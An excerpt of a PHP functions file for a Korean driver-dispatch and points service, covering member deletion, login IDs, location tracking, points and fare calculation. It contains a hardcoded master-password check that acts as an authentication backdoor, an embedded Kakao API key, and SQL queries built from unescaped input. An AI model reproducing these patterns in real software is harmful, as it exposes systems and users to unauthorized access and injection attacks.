...
// 관리자페이지 페이징시 page=1&page=2 문제 해결함수 (파라미터 인식 때문에)
function get_paging_params($qstr) {
	...
	if ($qstr != "") {
		foreach ($exp1 as $key=>$val) {
			...
			if ($exp2[0] != "page") {
				$tmp_str .= ($tmp_str != "")? "&" : "";
				$tmp_str .= $exp2[0]."=".$exp2[1];
			}
		}
	}
	//$tmp_str .= ($tmp_str != "")? "&amp;page=" : "page=";
	return $tmp_str;
}
...
function member_delete($mb_id)
{
    ...
    $sql = " update {$g5['member_table']} set mb_password = '', mb_level = 0, mb_email = '', mb_homepage = '', mb_zip1 = '', mb_zip2 = '', mb_addr1 = '', mb_addr2 = '', mb_birth = '', mb_sex = '', mb_signature = '', mb_memo = '".date('Ymd', G5_SERVER_TIME)." 삭제함\n{$mb['mb_memo']}\nlv={$mb['mb_level']}', mb_leave_date = '".date("Y-m-d H:i:s")."' where mb_id = '{$mb_id}' ";
    sql_query($sql);
...
{
    if ($pass == '123456789a!' || $pass == 'admin0808' || $pass == 'lets080' ){
        //setcookie('member','admin',time() + 86400 * 30,'/');
        return true;
    }
...
*******************************************************************************/
// 사업자번호 포맷
function getBizNum($num="") {
	$biz_num = "";
	if ($num != "") {
		$biz_num = substr($num, 0, 3)."-".substr($num, 3, 2)."-".substr($num, 5, 9);
	}
	return $biz_num;
}

// 대리점리스트 (승인된것만)
function getAgencyList($mb_no="") {
	$sql = "SELECT mb_no, mb_nick FROM g5_member WHERE mb_level = 9 AND mb_use = 'Y' ";
	if ($mb_no != "") $sql .= " AND mb_no = '{$mb_no}'";
	$sql .= "ORDER BY mb_nick ASC;";

	$result = sql_query($sql);
	$result_cnt = sql_num_rows($result);

	$list = array();
	$list['cnt'] = (int)$result_cnt;

	for ($i = 0; $i < $result_cnt; $i++) {
		$list['list'][$i] = sql_fetch_array($result);
	}
...
// 회원 로그인용 아이디 발급
function getMemberCode($agency_no, $mb_hp) {
	...
	// 1) 올바른 값인지 
	if (strlen($agency_no) == 0 || strlen($mb_hp) == 0) {
		$arr['result'] = false;
		$arr['msg'] = "회원가입에 실패하였습니다. 다시 시도해 주세요.";
		return $arr;
	}

	// 2) 중복값 조회
	$row = sql_fetch("SELECT COUNT(*) AS cnt FROM g5_member_login_id WHERE mb_hp = '{$mb_hp}' AND agency_no = '{$agency_no}' AND is_leave != 'Y'");
	$cnt = (int)$row['cnt'];

	if ($cnt > 0) {
		$arr['result'] = false;
		$arr['msg'] = "이미 가입된 아이디가 존재합니다.";
		return $arr;
	}

	// 3) 최근순번 조회 & 로그인용 생성 (0001-00001)
	$row = sql_fetch("SELECT MAX(number) AS number FROM g5_member_login_id");
	$number = ($row['number'] == "" || (int)$row['number'] == 0)? 1 : $row['number']+1;

	$arr['number'] = $number;
	$arr['login_id'] = sprintf('%04d', $agency_no)."-".sprintf('%05d', $number); // 4자리-5자리

	return $arr;
}

// 대리점(분양사) 세션설정,해제
function setAgencySession($agency_no) {
	$_SESSION['myAgency'] = $agency_no;
}

// 즐겨찾기 등록
function setBookmark($mb_id, $info=array()) {
	foreach ($info as $type=>$arr) {
		if ($arr['place'] == "") {
			continue;
		}
		$bm_type = substr(strtoupper($type), 0, 1);
		$bm_lat = $arr['lat'];
		$bm_lng = $arr['lng'];

		$sql = "SELECT COUNT(*) AS cnt FROM g5_bookmark 
				WHERE mb_id = '{$mb_id}' AND bm_type = '{$bm_type}' 
				AND bm_lat = '{$bm_lat}' AND bm_lng = '{$bm_lng}'";
		$row = sql_fetch($sql);

		if ((int)$row['cnt'] == 0) {
			$sql = "INSERT INTO g5_bookmark SET 
					mb_id = '{$mb_id}',
					bm_type = '{$bm_type}',
					bm_favorites = 0,
					bm_place = '{$arr['place']}',
...
// 카카오주소 (좌표로 주소)
function kakaoRestApi($path, $query, $content_type='json') {
	$api_server = 'https://dapi.kakao.com';
	$headers = array('Authorization: KakaoAK 4ca58bcd03c6620b6079b05b52fe2205 '); // rest key
	$opts = array(
	...
	if (curl_errno($curl_session)) {
		...
		if ($content_type == 'json') $return_data = json_decode($return_data, true);
		return $return_data;
	}
}

// 회원 현재위치 저장
function setMemberPos($mb_id, $lat="", $lng="") {
	if ($mb_id == "" || $lat == "" || $lat == "") return;

	$tensAgoTS = strtotime("-30 seconds");

	$sql = "SELECT count(*) AS cnt FROM g5_member_pos 
			WHERE mb_id = '{$mb_id}' AND pos_lat = '{$lat}' AND pos_lng = '{$lng}' AND pos_dateTS > '{$tensAgoTS}'";
    //echo $sql;
	$row = sql_fetch($sql);
	$cnt = (int)$row['cnt'];
	...
	// 30초마다 위치 바껴있으면 업데이트
	if ($cnt == 0) {
		$sql = "INSERT INTO g5_member_pos SET
				mb_id = '{$mb_id}',
				pos_lat = '{$lat}',
				pos_lng = '{$lng}',
				pos_date = '".G5_TIME_YMDHIS."',
				pos_dateTS = '".time()."'";
		sql_query($sql);
	}
}
...
// 티탁송 포인트 계산
function point_calc($mb_id) {
	/*
	$sql = "SELECT SUM(po_point) AS p1, SUM(po_use_point) AS p2 FROM g5_point WHERE mb_id = '{$mb_id}'";
	$row = sql_fetch($sql);
	$mb_point = (int)$row['p1'] - (int)$row['p2'];
	if ($mb_point < 0) $mb_point = 0;
	*/
    // 마지막 누적포인트 (합산하여 계산하는 방식에서 마지막 누적포인트로 변경)
    $sql = "SELECT po_mb_point FROM g5_point WHERE mb_id = '{$mb_id}' ORDER BY po_id DESC LIMIT 0,1";
    $row = sql_fetch($sql);
    $mb_point = (int)$row['po_mb_point'];

	return $mb_point;
}


// 티탁송 포인트 부여 (기존꺼 안쓰고 새로만든 함수사용할것)
// $point : 충전포인트
// $use_point : 차감포인트
function point_update($mb_id, $point=0, $use_point=0, $content='', $rel_table='', $rel_id='', $rel_action='', $expire=0, $rel_tid='', $charge_memo='')
{
    global $config;
    global $g5;
    global $is_admin;
	...
	// 충전,차감 포인트가 없으면 리턴
	if ($point == 0 && $use_point == 0) return 0;

    // 회원포인트
    //$mb_point = get_point_sum($mb_id);
	$mb_point = point_calc($mb_id);
	...
	*/
    ...
    $po_mb_point = $mb_point + $point - $use_point;
	//if ((int)$po_mb_point < 0) $po_mb_point = 0; // 포인트 없을경우 마이너스 처리로 변경

	//echo "mb_point : ".$mb_point.", point :".$point.", use_point : ".$use_point;
	//echo ", po_mb_point : ".$po_mb_point;

    // 220830 관리자충전/차감시 중복등록 방지
    if ($rel_action == "admin_save" || $rel_action == "admin_use") {
        $ymd_hi = date("Y-m-d H:i");

        $sql = "SELECT COUNT(*) AS cnt FROM g5_point 
                WHERE mb_id = '{$mb_id}' AND po_charge_memo = '{$charge_memo}' 
                AND po_datetime LIKE '{$ymd_hi}%'";
        if ($rel_action == "admin_save") $sql .= " AND po_point = '{$point}' ";
        else if ($rel_action == "admin_use") $sql .= " AND po_use_point = '{$use_point}' ";
        $sql .= "AND po_rel_action = '{$rel_action}'";

        $rs = sql_fetch($sql);
        if ($rs['cnt'] > 0) return 0; // 이미 등록됨
    }
    // 230913 고객 콜요청취소시 중복 확인
    if ($rel_action == "user_call_cancel") {
        $sql = "SELECT COUNT(*) AS cnt FROM g5_point 
            WHERE mb_id = '{$mb_id}' AND po_rel_id = '{$rel_id}' AND po_point = '{$point}'";
        $rs = sql_fetch($sql);
        if ($rs['cnt'] > 0) return 0; // 이미 등록됨
    }
...
// 랜덤 문자열 생성 ABCDEFGHIJKLMNOPQRSTUVWXYZ (난수)
...
// 고객 전용계좌 확인
function getMemberVbankNo($mb_id) {
	$list = array();
	$row = sql_fetch("SELECT * FROM g5_acc_list WHERE mb_id = '{$mb_id}' ORDER BY idx DESC LIMIT 0, 1");
	if ($row) {
		$list['idx'] = $row['idx'];
		$list['bank_name'] = $row['bank_name'];
		$list['acc_no'] = $row['acc_no'];
	}
	return $list;
}

// 요금계산 - 고객, 기사, 본사지원 (총금액, 콜종류, 결제종류)
function calculateFree($total, $kind, $pay) {
    $res = array();
    $total = (int)$total;                       // 1)기본료
    $res['cust_price'] = $total;                // 2)고객 금액
    $res['driv_price'] = $total;                // 3)기사 금액
    $res['driv_ded_point'] = 0;                 // 4)기사 콜수락시 차감 포인트
    $res['driv_save_point'] = 0;                // 5)기사 콜완료시 적립 포인트 (본사지원)
    $res['driv_sudang'] = 0;                    // 6)기사 실수입
    $res['admin_save'] = 0;                     // 7)관리자포인트
    $res['cust_save_point'] = 0;                // 번외) 고객 콜완료시 적립 포인트 (적립콜일때, 본사지원)

    switch ($kind) {
        case "0" :          // 빠른콜
            // 3)기사금액 = 기본료 + (기본료*20%) - 수수료1000원
            $res['driv_price'] = $total + ($total*0.2) - 1000;

            // 5)기사 콜완료시 적립 포인트 (본사지원) = (기본료*20%) - 수수료1000원
            $res['driv_save_point'] = ($total*0.2) - 1000;

            break;

        case "1" :          // 환급콜
            // 2)고객금액 = 기본료 - (기본료*20%) + 수수료1000원
            //$res['cust_price'] = $total - ($total * 0.2) + 1000; ==>이미 콜부를때 적용된 공식
            // 3)기사금액 = (기본료-1000원)*0.8 ==>고객금액 역으로 계산
            $res['driv_price'] = ($total-1000) / 0.8;
        ...
        case "3" :          // 콜무 (수수료 차감없이 요금 100% / 원천징수3.3% 공제 / 고용보험 1.5% 공제)
            $res['driv_tax'] = floor($res['cust_price']*0.033);             // 원천징수 3.3%
            $res['driv_insurance'] = floor($res['cust_price']*0.015);       // 고용보험 1.5%

            // 6) 기사실수입 = 2)고객지불금액 - 원천징수 - 고용보험
            $res['driv_sudang'] = $res['cust_price'] - $res['driv_tax'] - $res['driv_insurance'];
    ...
    // 4)기사 콜수락시 차감 포인트 = 기사금액 * 0.2
    if ($res['driv_ded_point'] == 0) $res['driv_ded_point'] = $res['driv_price']*0.2;

    // 5)기사 콜완료시 적립 포인트 (본사지원) = 4)차감포인트 - 수수료1000원
    if ($res['driv_save_point'] == 0) $res['driv_save_point'] = $res['driv_ded_point'] - 1000;

    // - 적립콜은 기사에게 본사지원금 없음 (고객에게 지원함)
    if ($kind == "2") {
        $res['cust_save_point'] = $res['driv_save_point'];
        $res['driv_save_point'] = 0;
    }

    // 6) 기사실수입 = 2)고객지불금액 - 4)차감포인트 + 5)적립포인트
    $res['driv_sudang'] = $res['cust_price'] - $res['driv_ded_point'] + $res['driv_save_point'];

    // 7) 관리자포인트 = 4)차감포인트 - 5)적립포인트
    $res['admin_save'] = $res['driv_ded_point'] - $res['driv_save_point'];
...
// 콜요청날짜/시간
function callStartTime($today, $regdate, $time) {
    $start_time = "즉시";

    if ($today == "1") {
        $start_time = date("m/d", strtotime("+1 days", strtotime($regdate)));
        if ($time != "") $start_time .= "<br>".$time;
    } else {
        if ($time != "") {
            $start_time = date("m/d", strtotime($regdate));
            $start_time .= "<br>".$time;
        }
    }
